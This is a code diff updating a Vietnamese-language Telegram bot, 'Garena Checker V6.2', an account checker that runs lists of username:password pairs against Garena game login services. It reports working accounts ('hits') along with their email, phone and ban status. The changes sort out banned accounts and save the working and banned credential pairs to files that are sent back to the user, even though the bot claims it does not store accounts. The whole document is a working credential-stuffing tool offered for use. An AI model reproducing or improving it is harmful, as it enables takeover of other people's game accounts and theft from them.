@@ -1,5 +1,5 @@
 # ========================================================================
-#    GARENA CHECKER BOT V6.1 - FIX FORMAT DUNG API
+#    GARENA CHECKER BOT V6.2 - FULL CHECK ALL + LOC ACC BAN YES
 # ========================================================================
 import subprocess, sys, importlib, threading, time, json, os, re, struct, math
 import telebot, requests
@@ -33,6 +33,8 @@ CHECKMULTI_DELAY = 0.5
 CHECKMULTI_BATCH_SIZE = 10
 CHECKMULTI_BATCH_DELAY = 3.0
 OUTPUT_LOC = "loc_accounts.txt"
+OUTPUT_SACH = "loc_acc_sach.txt"
+OUTPUT_BAN = "loc_acc_ban.txt"
 STATS_FILE = "check_stats.json"
 MAX_MESSAGE_LENGTH = 4000
 
@@ -49,7 +51,7 @@ SERVICE_ROUTES = {
 checking = False
 stop_event = threading.Event()
 pending_accounts = {}
-stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
+stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "banned": 0, "start_time": 0}
 file_lock = threading.Lock()
 stats_lock = threading.Lock()
 cache_results = {}
@@ -82,7 +84,7 @@ class RenderHandler(BaseHTTPRequestHandler):
             stats_data = load_stats()
             with SESSION_LOCK:
                 session_data = {"session": SESSION_STATS, "uptime": time.time() - start_time, "is_checking": checking, "services": list(SERVICE_ROUTES.keys())}
-            self.wfile.write(json.dumps({"status": "alive", "checking": checking, "stats": stats, "services": list(SERVICE_ROUTES.keys()), "admin": "baohuyno1", "version": "6.1", "total_stats": stats_data, "session_stats": session_data}, ensure_ascii=False).encode('utf-8'))
+            self.wfile.write(json.dumps({"status": "alive", "checking": checking, "stats": stats, "services": list(SERVICE_ROUTES.keys()), "admin": "baohuyno1", "version": "6.2", "total_stats": stats_data, "session_stats": session_data}, ensure_ascii=False).encode('utf-8'))
         elif self.path == '/api/stats/detailed':
             self.send_response(200)
             self.send_header('Content-type', 'application/json; charset=utf-8')
@@ -121,7 +123,7 @@ class RenderHandler(BaseHTTPRequestHandler):
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GARENA CHECKER - HACKER EDITION V6.1</title>
+<title>GARENA CHECKER V6.2 - LOC ACC BAN</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@400;600;700&display=swap');
 * {{ margin: 0; padding: 0; box-sizing: border-box; }}
@@ -168,7 +170,6 @@ body {{ font-family: 'Inter', 'Orbitron', 'Courier New', sans-serif; background:
 .stat-checked .stat-value {{ color:#00ccff; }}
 .stat-total .stat-value {{ color:#ff00ff; }}
 .stat-totalchecked .stat-value {{ color:#ffaa00; }}
-.stat-time .stat-value {{ color:#ff00ff; font-size:1em; }}
 .detail-stats {{ background:rgba(0,0,0,0.7); border-radius:12px; padding:15px 20px; margin:15px 0; border:1px solid rgba(0,255,0,0.1); display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:10px; }}
 .detail-row {{ display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px solid rgba(0,255,0,0.05); font-size:0.9em; }}
 .detail-row span:first-child {{ color:#88aa88; }}
@@ -211,8 +212,8 @@ body {{ font-family: 'Inter', 'Orbitron', 'Courier New', sans-serif; background:
 <canvas id="laser-canvas"></canvas>
 <div class="container">
     <div class="header">
-        <div class="title">🎮 GARENA CHECKER</div>
-        <div class="subtitle">Version 6.1 - HACKER EDITION</div>
+        <div class="title">🎮 GARENA CHECKER V6.2</div>
+        <div class="subtitle">HACKER EDITION - LOC ACC BAN</div>
         <div class="subtitle">Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;text-decoration:none;">@baohuyno1</a></div>
         <div class="social-buttons">
             <a href="https://tiktok.com/@baohuy1109" target="_blank" class="social-btn tiktok">🎵 TikTok @baohuy1109</a>
@@ -246,7 +247,7 @@ body {{ font-family: 'Inter', 'Orbitron', 'Courier New', sans-serif; background:
     <div class="recent-checks" id="recent-checks"><div style="text-align:center;color:#446644;padding:10px;">Loading...</div></div>
     <div class="footer">
         <p>© 2024 <a href="https://t.me/baohuyno1">@baohuyno1</a> - All rights reserved</p>
-        <p style="color:#334433;font-size:0.65em;">⚡ HACKER EDITION - 3D EFFECTS - AUTO AUDIO - FULL INFO</p>
+        <p style="color:#334433;font-size:0.65em;">⚡ HACKER EDITION - 3D EFFECTS - AUTO AUDIO - FULL INFO - LOC ACC BAN</p>
     </div>
 </div>
 <audio id="bg-audio" loop autoplay>
@@ -358,9 +359,7 @@ function updateStats() {{
 }}
 setInterval(updateStats, 3000);
 updateStats();
-console.log('🔥 GARENA CHECKER HACKER EDITION V6.1 LOADED!');
-console.log('📊 FULL INFO - STATS SAVED TO check_stats.json');
-console.log('🎵 AUTO AUDIO FIXED - 3D EFFECTS ENABLED');
+console.log('🔥 GARENA CHECKER V6.2 LOADED - LOC ACC BAN!');
 </script>
 </body>
 </html>"""
@@ -377,10 +376,7 @@ def start_render_server():
         server = HTTPServer(("0.0.0.0", port), RenderHandler)
         print(f"[*] Render web server chay tren port {port}")
         print(f"[*] Dashboard: http://0.0.0.0:{port}")
-        print(f"[*] HIEU UNG 3D + HACKER DEP")
-        print(f"[*] AM THANH TU DONG PHAT")
-        print(f"[*] LUU THONG KE VAO {STATS_FILE}")
-        print(f"[*] TRA KET QUA FULL INFO")
+        print(f"[*] V6.2 - LOC ACC BAN YES")
         server.serve_forever()
     except Exception as e:
         print(f"[!] Loi web server: {e}")
@@ -790,7 +786,7 @@ def check_account_api(username, password, service, use_delay=True):
                                 if isinstance(band_val, bool) and band_val:
                                     is_banded = True
                                     break
-                                elif isinstance(band_val, str) and band_val.lower() in ["true", "yes", "1", "ban", "banned", "yes"]:
+                                elif isinstance(band_val, str) and band_val.lower() in ["true", "yes", "1", "ban", "banned"]:
                                     is_banded = True
                                     break
                                 elif isinstance(band_val, (int, float)) and band_val > 0:
@@ -816,26 +812,27 @@ def check_account_api(username, password, service, use_delay=True):
                         if "ban" in message_val or "banned" in message_val:
                             is_banded = True
                         
+                        # ========== NEU ACC BI BAN -> TRA VE DEAD ==========
+                        if is_banded:
+                            result = {"result": "dead", "_is_banded": True, "_band_reason": "Acc bi ban"}
+                            with cache_lock:
+                                cache_results[cache_key] = result
+                            return result
+                        
                         # ========== XAC DINH HIT ==========
                         status_val = result_data.get("status")
                         if status_val is not None:
                             if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS", "HIT", "hit"]:
                                 is_hit = True
                             elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
-                                if is_banded:
-                                    is_hit = True
-                                else:
-                                    is_hit = False
+                                is_hit = False
                         
                         success_val = result_data.get("success")
                         if not is_hit and success_val is not None:
                             if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                 is_hit = True
                             elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
-                                if is_banded:
-                                    is_hit = True
-                                else:
-                                    is_hit = False
+                                is_hit = False
                         
                         result_val = result_data.get("result")
                         if result_val is not None:
@@ -843,19 +840,13 @@ def check_account_api(username, password, service, use_delay=True):
                             if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                                 is_hit = True
                             elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
-                                if is_banded:
-                                    is_hit = True
-                                else:
-                                    is_hit = False
+                                is_hit = False
                         
                         if message_val:
                             if any(word in message_val for word in ["thanh cong", "success", "valid", "hit", "live", "ok"]):
                                 is_hit = True
                             elif any(word in message_val for word in ["that bai", "fail", "invalid", "dead", "error"]):
-                                if is_banded:
-                                    is_hit = True
-                                else:
-                                    is_hit = False
+                                is_hit = False
                         
                         if data_val is not None:
                             if isinstance(data_val, (dict, list, str)) and data_val:
@@ -869,10 +860,6 @@ def check_account_api(username, password, service, use_delay=True):
                         
                         if result_data.get("uid") or result_data.get("aov_uid") or result_data.get("id"):
                             is_hit = True
-                        
-                        if is_banded:
-                            is_hit = True
-                            result_data["_is_banded"] = True
                         
                         result_data["result"] = "hit" if is_hit else "dead"
                         with cache_lock:
@@ -890,7 +877,7 @@ def check_account_api(username, password, service, use_delay=True):
                     elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error", "die"]):
                         result = {"result": "dead"}
                     elif "ban" in text_lower:
-                        result = {"result": "hit", "_is_banded": True}
+                        result = {"result": "dead", "_is_banded": True}
                     else:
                         result = {"result": "unknown"}
                     with cache_lock:
@@ -995,7 +982,7 @@ def format_full_info(username, password, service, result_data):
                 if label not in info_dict or info_dict[label] is None:
                     info_dict[label] = value
     
-    # ========== XU LY BOOLEAN ==========
+    # Boolean xu ly
     if "📩 EMAIL" in info_dict:
         val = info_dict["📩 EMAIL"]
         if isinstance(val, bool):
@@ -1044,7 +1031,6 @@ def format_full_info(username, password, service, result_data):
     else:
         info_dict["🔗 FB"] = "NO"
     
-    # ========== BAND ==========
     if "🚫 BAND" in info_dict:
         val = info_dict["🚫 BAND"]
         if isinstance(val, bool):
@@ -1054,8 +1040,6 @@ def format_full_info(username, password, service, result_data):
                 info_dict["🚫 BAND"] = "YES"
             elif val.lower() in ["false", "no", "0"]:
                 info_dict["🚫 BAND"] = "NO"
-            else:
-                info_dict["🚫 BAND"] = "YES" if val else "NO"
     elif result_data.get("_is_banded"):
         info_dict["🚫 BAND"] = "YES"
     else:
@@ -1085,7 +1069,7 @@ def format_full_info(username, password, service, result_data):
     else:
         info_dict["🛡 Authen"] = "No"
     
-    # ========== TINH TRANG ==========
+    # Tinh trang
     tinh_trang_parts = []
     if info_dict.get("📩 EMAIL", "").startswith("Chưa Xác Thực [Yes]"):
         tinh_trang_parts.append("Mail")
@@ -1093,18 +1077,13 @@ def format_full_info(username, password, service, result_data):
         tinh_trang_parts.append("SĐT")
     if info_dict.get("🛡 PASS") == "Yes":
         tinh_trang_parts.append("Pass")
-    if info_dict.get("🚫 BAND") == "YES":
-        tinh_trang_parts.append("BAN")
     
     if tinh_trang_parts:
-        if "BAN" in tinh_trang_parts:
-            info_dict["📋 Tình Trạng"] = "Full Info [BAN]"
-        else:
-            info_dict["📋 Tình Trạng"] = f"Acc Dính {' + '.join(tinh_trang_parts)}"
+        info_dict["📋 Tình Trạng"] = f"Acc Dính {' + '.join(tinh_trang_parts)}"
     else:
         info_dict["📋 Tình Trạng"] = "Acc Sạch"
     
-    # ========== LIST SS/ANIME/OTHER ==========
+    # List SS/Anime/Other
     for label, list_keys in [
         ("✨ SS", ["aov_ss_list", "ss_list", "aov_ss", "ss"]),
         ("🔥 Anime", ["aov_anime_list", "anime_list", "aov_anime", "anime"]),
@@ -1120,7 +1099,7 @@ def format_full_info(username, password, service, result_data):
                     info_dict[label] = str(val)
                     break
     
-    # ========== THOI GIAN ==========
+    # Thoi gian
     if "⏰ Login cuối" in info_dict:
         val = info_dict["⏰ Login cuối"]
         if isinstance(val, (int, float)) and val > 1000000000:
@@ -1138,7 +1117,6 @@ def format_full_info(username, password, service, result_data):
         elif isinstance(val, (int, float)) and val == 0:
             info_dict["💰 Nạp sò"] = "01/01/1970"
     
-    # ========== BUILD MESSAGE ==========
     msg = f"✅ HIT\n🔑 <code>{username}:{password}</code>\n"
     
     for label in display_order:
@@ -1164,6 +1142,13 @@ def check_single(chat_id, username, password, service="lienquan"):
     safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
     result = check_account_api(username, password, service, use_delay=False)
     result_type = result.get("result", "unknown")
+    is_banded = result.get("_is_banded", False)
+    
+    if is_banded:
+        safe_send_message(chat_id, f"🚫 <b>ACC BI BAN - BO QUA</b>\n🔑 <code>{username}:{password}</code>")
+        update_stats(dead_count=1, account_details=[{"user": username, "pwd": password, "service": service, "status": "banned", "time": datetime.now().strftime("%H:%M:%S")}])
+        return
+    
     account_detail = {"user": username, "pwd": password, "service": service, "status": result_type, "time": datetime.now().strftime("%H:%M:%S")}
     if result_type == "hit":
         safe_send_message(chat_id, format_full_info(username, password, service, result))
@@ -1183,33 +1168,47 @@ def check_batch(chat_id, accounts, service):
     checking = True
     stop_event.clear()
     total = len(accounts)
-    stats = {"total": total, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": time.time()}
+    stats = {"total": total, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "banned": 0, "start_time": time.time()}
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
-    safe_send_message(chat_id, f"""{icon} <b>BAT DAU CHECK - V6.1</b>
+    safe_send_message(chat_id, f"""{icon} <b>BAT DAU CHECK - V6.2</b>
 📊 Tong: <code>{total}</code> accounts
 🎯 Service: <b>{service_desc}</b>
-⚡ Threads: <code>{CHECKMULTI_THREADS}</code>
-⏱ Delay: <code>{CHECKMULTI_DELAY}s</code>
-📦 Batch: <code>{CHECKMULTI_BATCH_SIZE} acc/batch</code>""")
+🚫 <b>TU DONG BO ACC BAN YES</b>""")
+    
     batches = []
     for i in range(0, total, CHECKMULTI_BATCH_SIZE):
         batches.append(accounts[i:i + CHECKMULTI_BATCH_SIZE])
     total_batches = len(batches)
     batch_num = 0
     all_results = []
+    banned_accounts = []
+    clean_accounts = []
+    
     def process_single(user, pwd):
         if stop_event.is_set():
             return
         rate_limit(CHECKMULTI_DELAY)
         result = check_account_api(user, pwd, service, use_delay=False)
         result_type = result.get("result", "unknown")
+        is_banded = result.get("_is_banded", False)
+        
+        if is_banded:
+            banned_accounts.append((user, pwd))
+            all_results.append({"user": user, "pwd": pwd, "service": service, "status": "banned", "time": datetime.now().strftime("%H:%M:%S")})
+            with stats_lock:
+                stats["checked"] += 1
+                stats["banned"] += 1
+            return
+        
         account_detail = {"user": user, "pwd": pwd, "service": service, "status": result_type, "time": datetime.now().strftime("%H:%M:%S")}
         all_results.append(account_detail)
+        
         with stats_lock:
             stats["checked"] += 1
             if result_type == "hit":
                 stats["hits"] += 1
+                clean_accounts.append((user, pwd))
                 try:
                     safe_send_message(chat_id, format_full_info(user, pwd, service, result))
                 except Exception as e:
@@ -1218,6 +1217,7 @@ def check_batch(chat_id, accounts, service):
                 stats["dead"] += 1
             else:
                 stats["errors"] += 1
+    
     for batch in batches:
         if stop_event.is_set():
             break
@@ -1233,40 +1233,62 @@ def check_batch(chat_id, accounts, service):
         speed = stats["checked"] / elapsed if elapsed > 0 else 0
         percent = (stats["checked"] / total) * 100
         safe_send_message(chat_id, f"""📊 <b>TIEN DO - {stats['checked']}/{total}</b> ({percent:.1f}%)
-✅ Hits: <code>{stats['hits']}</code> | ❌ Dead: <code>{stats['dead']}</code> | ⚠️ Errors: <code>{stats['errors']}</code>
+✅ Hits (Sach): <code>{stats['hits']}</code> | ❌ Dead: <code>{stats['dead']}</code>
+🚫 Banned (Da bo): <code>{stats['banned']}</code>
 ⚡ Speed: <code>{speed:.1f}</code> acc/s""")
         if batch_num < total_batches:
             time.sleep(CHECKMULTI_BATCH_DELAY)
+    
     checking = False
     elapsed = time.time() - stats["start_time"]
-    update_stats(hit_count=stats["hits"], dead_count=stats["dead"], error_count=stats["errors"], accounts=accounts, account_details=all_results)
+    
+    if clean_accounts:
+        with file_lock:
+            with open(OUTPUT_SACH, 'w', encoding='utf-8') as f:
+                for user, pwd in clean_accounts:
+                    f.write(f"{user}:{pwd}\n")
+    
+    if banned_accounts:
+        with file_lock:
+            with open(OUTPUT_BAN, 'w', encoding='utf-8') as f:
+                for user, pwd in banned_accounts:
+                    f.write(f"{user}:{pwd}\n")
+    
+    update_stats(hit_count=stats["hits"], dead_count=stats["dead"] + stats["banned"], error_count=stats["errors"], accounts=accounts, account_details=all_results)
+    
     summary = f"""✅ <b>CHECK HOAN TAT!</b>
 ━━━━━━━━━━━━━━━━━━━━━━
 📊 Tong: <code>{stats['total']}</code>
-🎯 HIT: <code>{stats['hits']}</code>
+🎯 HIT (Sach): <code>{stats['hits']}</code>
 ❌ DEAD: <code>{stats['dead']}</code>
+🚫 BANNED (Da bo): <code>{stats['banned']}</code>
 ⚠️ ERROR: <code>{stats['errors']}</code>
 ⏱ Thoi gian: <code>{elapsed:.1f}s</code>
-⚡ Speed: <code>{stats['checked']/elapsed:.1f}</code> acc/s
 ━━━━━━━━━━━━━━━━━━━━━━"""
+    
     hits_list = [r for r in all_results if r["status"] == "hit"]
     if hits_list:
-        summary += f"\n📌 <b>HIT LIST ({len(hits_list)}):</b>\n"
+        summary += f"\n📌 <b>HIT LIST - ACC SACH ({len(hits_list)}):</b>\n"
         for r in hits_list[:20]:
             summary += f"✅ <code>{r['user']}:{r['pwd']}</code>\n"
         if len(hits_list) > 20:
             summary += f"... va {len(hits_list) - 20} hits khac"
-    dead_list = [r for r in all_results if r["status"] == "dead"]
-    if dead_list and len(dead_list) <= 20:
-        summary += f"\n❌ <b>DEAD LIST ({len(dead_list)}):</b>\n"
-        for r in dead_list[:10]:
-            summary += f"❌ <code>{r['user']}:{r['pwd']}</code>\n"
-        if len(dead_list) > 10:
-            summary += f"... va {len(dead_list) - 10} dead khac"
+    
+    if banned_accounts:
+        summary += f"\n🚫 <b>ACC BI BAN DA BO ({len(banned_accounts)}):</b>\n"
+        summary += f"🚫 <code>{banned_accounts[0][0]}:{banned_accounts[0][1]}</code>"
+        if len(banned_accounts) > 1:
+            summary += f" ... va {len(banned_accounts) - 1} acc ban khac"
+    
     safe_send_message(chat_id, summary)
+    
     try:
-        with open(STATS_FILE, 'r', encoding='utf-8') as f:
-            bot.send_document(chat_id, f, caption=f"📊 check_stats.json - {stats['hits']} hits")
+        if clean_accounts:
+            with open(OUTPUT_SACH, 'r', encoding='utf-8') as f:
+                bot.send_document(chat_id, f, caption=f"✅ ACC SACH - {len(clean_accounts)} acc")
+        if banned_accounts:
+            with open(OUTPUT_BAN, 'r', encoding='utf-8') as f:
+                bot.send_document(chat_id, f, caption=f"🚫 ACC BAN DA BO - {len(banned_accounts)} acc")
     except:
         pass
 
@@ -1282,23 +1304,44 @@ def check_all_services(chat_id, accounts):
     stop_event.clear()
     total_accounts = len(accounts)
     total_services = len(SERVICE_ROUTES)
-    safe_send_message(chat_id, f"""⚡ <b>CHECK TAT CA SERVICE</b>
+    safe_send_message(chat_id, f"""⚡ <b>CHECK TAT CA SERVICE - V6.2</b>
 📊 Accounts: <code>{total_accounts}</code>
-📋 Services: <code>{total_services}</code>""")
-    stats_all = {"total": total_accounts * total_services, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "start_time": time.time()}
+📋 Services: <code>{total_services}</code>
+🚫 <b>TU DONG BO ACC BAN YES</b>""")
+    
+    stats_all = {"total": total_accounts * total_services, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "banned": 0, "start_time": time.time()}
     all_results = []
+    banned_accounts = []
+    clean_accounts = []
+    
     def process_all(user, pwd, service):
         if stop_event.is_set():
             return
         rate_limit(DEFAULT_DELAY)
         result = check_account_api(user, pwd, service, use_delay=False)
         result_type = result.get("result", "unknown")
+        is_banded = result.get("_is_banded", False)
+        
+        if is_banded:
+            key = f"{user}:{pwd}"
+            if key not in [f"{u}:{p}" for u, p in banned_accounts]:
+                banned_accounts.append((user, pwd))
+            all_results.append({"user": user, "pwd": pwd, "service": service, "status": "banned", "time": datetime.now().strftime("%H:%M:%S")})
+            with stats_lock:
+                stats_all["checked"] += 1
+                stats_all["banned"] += 1
+            return
+        
         account_detail = {"user": user, "pwd": pwd, "service": service, "status": result_type, "time": datetime.now().strftime("%H:%M:%S")}
         all_results.append(account_detail)
+        
         with stats_lock:
             stats_all["checked"] += 1
             if result_type == "hit":
                 stats_all["hits"] += 1
+                key = f"{user}:{pwd}"
+                if key not in [f"{u}:{p}" for u, p in clean_accounts]:
+                    clean_accounts.append((user, pwd))
                 try:
                     safe_send_message(chat_id, format_full_info(user, pwd, service, result))
                 except:
@@ -1307,11 +1350,13 @@ def check_all_services(chat_id, accounts):
                 stats_all["dead"] += 1
             else:
                 stats_all["errors"] += 1
+    
     batches = []
     for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE):
         batches.append(accounts[i:i + CHECKMULTI_BATCH_SIZE])
     batch_num = 0
     total_batches = len(batches)
+    
     for batch_accounts in batches:
         if stop_event.is_set():
             break
@@ -1328,29 +1373,64 @@ def check_all_services(chat_id, accounts):
         speed = stats_all["checked"] / elapsed if elapsed > 0 else 0
         percent = (stats_all["checked"] / stats_all["total"]) * 100
         safe_send_message(chat_id, f"""📊 <b>TIEN DO - {stats_all['checked']}/{stats_all['total']}</b> ({percent:.1f}%)
-🎯 Hits: <code>{stats_all['hits']}</code> | ❌ Dead: <code>{stats_all['dead']}</code>
+🎯 Hits (Sach): <code>{stats_all['hits']}</code> | ❌ Dead: <code>{stats_all['dead']}</code>
+🚫 Banned (Da bo): <code>{stats_all['banned']}</code>
 ⚡ Speed: <code>{speed:.1f}</code> acc/s""")
         if batch_num < total_batches:
             time.sleep(CHECKMULTI_BATCH_DELAY)
+    
     checking = False
     elapsed = time.time() - stats_all["start_time"]
-    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"], error_count=stats_all["errors"], accounts=accounts, account_details=all_results)
-    summary = f"""✅ CHECK ALL HOAN TAT!
+    
+    if clean_accounts:
+        with file_lock:
+            with open(OUTPUT_SACH, 'w', encoding='utf-8') as f:
+                for user, pwd in clean_accounts:
+                    f.write(f"{user}:{pwd}\n")
+    
+    if banned_accounts:
+        with file_lock:
+            with open(OUTPUT_BAN, 'w', encoding='utf-8') as f:
+                for user, pwd in banned_accounts:
+                    f.write(f"{user}:{pwd}\n")
+    
+    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"] + stats_all["banned"], error_count=stats_all["errors"], accounts=accounts, account_details=all_results)
+    
+    summary = f"""✅ <b>CHECK ALL HOAN TAT!</b>
 ━━━━━━━━━━━━━━━━━━━━━━
-🎯 Hits: {stats_all['hits']}
-❌ Dead: {stats_all['dead']}
-⚠️ Errors: {stats_all['errors']}
-⏱ Time: {elapsed:.1f}s
-⚡ Speed: {stats_all['checked']/elapsed:.1f} acc/s
+📊 Tong Accounts: <code>{total_accounts}</code>
+🎯 HIT (Sach): <code>{stats_all['hits']}</code>
+❌ DEAD: <code>{stats_all['dead']}</code>
+🚫 BANNED (Da bo): <code>{stats_all['banned']}</code>
+⚠️ ERROR: <code>{stats_all['errors']}</code>
+⏱ Time: <code>{elapsed:.1f}s</code>
 ━━━━━━━━━━━━━━━━━━━━━━"""
+    
     hits_list = [r for r in all_results if r["status"] == "hit"]
     if hits_list:
-        summary += f"\n📌 HIT LIST ({len(hits_list)}):\n"
+        summary += f"\n📌 <b>HIT LIST - ACC SACH ({len(hits_list)}):</b>\n"
         for r in hits_list[:20]:
-            summary += f"✅ {r['user']}:{r['pwd']} ({r['service']})\n"
+            summary += f"✅ <code>{r['user']}:{r['pwd']}</code> ({r['service']})\n"
         if len(hits_list) > 20:
             summary += f"... va {len(hits_list) - 20} hits khac"
+    
+    if banned_accounts:
+        summary += f"\n🚫 <b>ACC BI BAN DA BO ({len(banned_accounts)}):</b>\n"
+        summary += f"🚫 <code>{banned_accounts[0][0]}:{banned_accounts[0][1]}</code>"
+        if len(banned_accounts) > 1:
+            summary += f" ... va {len(banned_accounts) - 1} acc ban khac"
+    
     safe_send_message(chat_id, summary)
+    
+    try:
+        if clean_accounts:
+            with open(OUTPUT_SACH, 'r', encoding='utf-8') as f:
+                bot.send_document(chat_id, f, caption=f"✅ ACC SACH - {len(clean_accounts)} acc")
+        if banned_accounts:
+            with open(OUTPUT_BAN, 'r', encoding='utf-8') as f:
+                bot.send_document(chat_id, f, caption=f"🚫 ACC BAN DA BO - {len(banned_accounts)} acc")
+    except:
+        pass
 
 # ========== LENH ==========
 @bot.message_handler(commands=['upaudio'])
@@ -1423,7 +1503,7 @@ def cmd_stats(message):
 def cmd_start(message):
     if not check_membership(message):
         return
-    safe_send_message(message.chat.id, """🤖 <b>GARENA CHECKER BOT V6.1 - HACKER EDITION</b>
+    safe_send_message(message.chat.id, """🤖 <b>GARENA CHECKER BOT V6.2 - LOC ACC BAN</b>
 👤 Admin: @baohuyno1
 🎵 TikTok: @baohuy1109
 
@@ -1436,7 +1516,7 @@ def cmd_start(message):
 /stop - Dung check
 
 ⚠️ <b>KHONG LUU ACCOUNT!</b>
-🔊 AM THANH TU DONG PHAT TREN WEB!
+🚫 <b>TU DONG BO ACC BAN YES!</b>
 📊 LUU THONG KE VAO check_stats.json
 📌 TRA KET QUA FULL INFO CHI TIET!""")
 
@@ -1543,6 +1623,7 @@ def handle_text(message):
 Preview:
 {preview}
 👇 /checkall - Check tat ca
+🚫 TU DONG BO ACC BAN YES!
 ⚠️ KHONG LUU ACCOUNT!""")
 
 @bot.message_handler(content_types=['document'])
@@ -1586,18 +1667,20 @@ def handle_document(message):
 Preview:
 {preview}
 👇 /checkall - Check tat ca
+🚫 TU DONG BO ACC BAN YES!
 ⚠️ KHONG LUU ACCOUNT!""")
     except Exception as e:
         safe_send_message(chat_id, f"❌ Loi: {e}")
 
 def main():
     print("=" * 60)
-    print("    GARENA CHECKER BOT V6.1 - HACKER EDITION")
+    print("    GARENA CHECKER BOT V6.2 - LOC ACC BAN YES")
     print("    ADMIN: @baohuyno1")
     print("    TIKTOK: @baohuy1109")
     print("    ===== HIEU UNG 3D + HACKER DEP =====")
     print("    ===== AM THANH TU DONG PHAT =====")
     print("    ===== KHONG LUU ACCOUNT =====")
+    print("    ===== TU DONG BO ACC BAN YES =====")
     print("    ===== LUU THONG KE VAO check_stats.json =====")
     print("    ===== TRA KET QUA FULL INFO =====")
     print("=" * 60)
